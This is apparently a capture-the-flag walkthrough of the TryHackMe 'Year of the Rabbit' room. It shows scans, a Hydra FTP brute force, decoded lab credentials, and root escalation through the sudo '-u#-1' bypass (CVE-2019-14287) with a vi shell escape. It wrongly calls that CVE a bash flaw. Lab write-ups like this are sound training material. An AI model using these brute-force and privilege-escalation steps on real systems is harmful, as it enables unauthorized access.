# [Year of the Rabbit THM Room](https://tryhackme.com/room/yearoftherabbit)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial target-ip
```

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-08 20:21 GMT
Nmap scan report for ip-10-10-74-152.eu-west-1.compute.internal (10.10.74.152)
Host is up (0.00056s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (EdDSA)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:CA:54:64:8F:4D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
```
### Gobuster
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.74.152
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/08 20:22:57 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2023/12/08 20:23:14 Finished
===============================================================
```
## Enumeration
### Port 80
- When we visit the the IP address through the web browser, we are greeted with the default Apache It Works! page. We can do the basic stuff like viewing the page source while [Gobuster](https://github.com/OJ/gobuster) runs in the background. There isn't much there, so we can move on. 
- Now that our [Gobuster](https://github.com/OJ/gobuster) scan has finished, we can visit some of the discovered directories. The `/assets` directory is going to be our first stop.
- Inside the `/assets` directory, we can see the following:

![Assets Directory with Rick Rolled](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/2bf08d3c-a12c-4c3e-af82-0629c98006ed)


- I know we're just going to get Rick Rolled, but we have to check out that .mp4 file. 
- And, as we expected, we are greeted with Rick Astley's classic tune: "Never Gonna Give You Up"
- Let's do some analysis on this file. We can save it to our local device. We can use things like [Exiftool](https://www.exiftool.org) and [Binwalk](https://github.com/ReFirmLabs/binwalk) to pull any juicy metadata we find. 
- Before we get too deep into that though, it's good practice to check the other files in this directory. When we look at the `style.css` file, we can see the following:

```
    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;
```
***Note: This is just a snippet of the full .css file.***

- If we try to visit the specified URL, we are greeted with this:

![Turn Off JavaScript](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/e15a8f6a-8b98-4cf2-ad8c-0dab2aec5b1f)


- When we do and refresh the page, we are redirected to a video of Rick Astley's "Never Gonna Give You Up" and we have, once again, been rick rolled. However, there is a clue written at the top:
```
Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
```

- When we watch the video, we can hear the following message around 56 seconds into it:
```
“I’ll put you out of your misery **burp** you’re looking in the wrong place”
```

- I think this is likely referring to using something like [Burp Suite](https://portswigger.net/burp), since we are evaluating a web page. Let's fire this up and see what we can see. 
- First, let's re-enable JavaScript. Next, we can navigate back to the target IP address home page that shows the default Apache page. Once we're here, ensure that intercept is on and go to `target-ip/sup3r_s3cr3t_fl4g.php`. Forward through the requests one at a time. You'll likely encounter things like `canonical.html`, but that isn't what we're looking for. At a certain point, you should see the following request be made:
```js
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: target-ip
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

- Here, we can see there is an `/intermediary.php` directory, and mention of a hidden directory. Let's begin by navigating to the hidden directory at `target-ip/WExYY2Cv-qU` . Make sure that intercept is off at this point to avoid potential headaches when trying load pages.
- When we arrive, we see a file named `Hot_Babe.png`. We can look at this picture and it seems to be just a woman. Let's try to pull this photo down and do some more analysis. I am going to use the following cURL syntax to do so:
```
curl http://target-ip/WExYY2Cv-qU/Hot_Babe.png --output file.png
```

- Let's start with some basic analysis. We can use the `strings` command on `file.png` to print any plaintext strings that may be hidden in the picture. Here is a snippet of the output that looks interesting:
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

- Now that we have the username and a potential wordlist, we can leverage something like [Hydra](https://github.com/vanhauser-thc/thc-hydra) to brute force the FTP login. First, let's copy and paste the potential password list into a `wordlist.txt` file to feed to [Hydra](https://github.com/vanhauser-thc/thc-hydra). Next, we can use the following syntax to start the attack:
```
hydra -l ftpuser -P wordlist.txt ftp://target-ip
```

- After a short time, we are greeted with the following output:
```
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-12-11 16:18:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://target-ip:21/
[21][ftp] host: target-ip   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-11 16:18:19
```

- We can see that we have uncovered the username/password combination of `ftpuser`:`5iez1wGXKfPKQ`. Let's log in to the FTP service on the target machine. 
- Once inside, we can list the contents of the directory with the `ls` command. When we do, we can see the following:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
```

- We can pull down the `Eli's_Creds.txt` file with the `get Eli's_Creds.txt` command. We can exit out of FTP with `exit` and can go look and see what's in that text file. My hunch is that it contains creds for the Eli user.
- Well, it certainly contains something. When we open the file, we are greeted with the following output:
```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

- After a bit of research, we can determine that this is an example of Brainfuck, which is an esoteric programming language. If you are interested, you can learn more [here](https://en.wikipedia.org/wiki/Brainfuck). Now that we know what this is, we can try to decipher it. 
- Using [this](https://www.dcode.fr/brainfuck-language) website, we can decode this content. When we do, we get the following information:
```
User: eli
Password: DSpDiM1wAEwid
```

- Let's use this information to login into SSH and get a foothold on the box. 

## System Hacking
- Now that we are logged in as the `Eli` user, we can have a look around and see what we can see. But first, there is a message left for Gwendoline from Root that says:
```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

- This gives us a handy little clue that could potentially lead us to vectors for pivoting and privilege escalation. 
- One of the first things I do when I get onto a box with a low privilege user is use the `sudo -l` command to see if the user I have compromised has any permissions to run something as root. This can be a great way to escalate privileges, especially with something like [GTFOBins](https://gtfobins.github.io/). Unfortunately, the `Eli` user can't run sudo on this machine. Let's keep looking. 
- We can navigate over to the `gwendoline` directory, but we don't have permission to open the `user.txt` file located there. We will have to find a way to pivot to the `gwendoline` user. 
- Since we know there is likely a `s3cr3t` directory, we can use the `find` command to search for it with the following syntax:
```
find / -name "s3cr3t" 2>>/dev/null
```

- Basically, the above command searches for a directory named `s3cr3t` and routes all errors to `/dev/null` so we don't see a bunch of stuff clogging up our terminal window. Here is what we get as output:
```
/usr/games/s3cr3t
```

- Great, now let's go have a look and see what juicy info we can uncover. 
- When we use `ls -la` to list the contents of the directory, we get the following: `.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`. Of course, we have to open it. I want to know what Gwendoline did. I love some workplace drama. Here's what it says:
```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

- Now that we have the password for the `gwendoline` user, we can switch over to that profile and get the `user.txt` flag in her home directory. 

## Privilege Escalation
- Now that we have the user flag, let's look for a way to get root permissions. Again, let's use `sudo -l` to check our current root permissions. When we run this, we get this output:
```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

- We can see that the `gwendoline` user can run `vi` as root, but only to edit the `user.txt` file found in their home directory. We can probably leverage this to spawn a root shell. Here is the syntax that we are going to use:
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

- This will leverage a bash vulnerability, specifically [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287). When we run this, all we have to do is spawn a privileged shell with `:!/bin/bash`
- Now that we are root, we can `cat /root/root.txt` to get the root flag. 

## Rabbit Holes (Get it?)
- I knew I had to leverage the insecure binary used by the `gwendoline` user, but I kept trying to use the syntax for `vi` found on [GTFOBins](https://gtfobins.github.io/), but that didn't quite work out. I had to do a little research and eventually found the actual solution to the problem, which leveraged running `vi` as root for one specific file. 
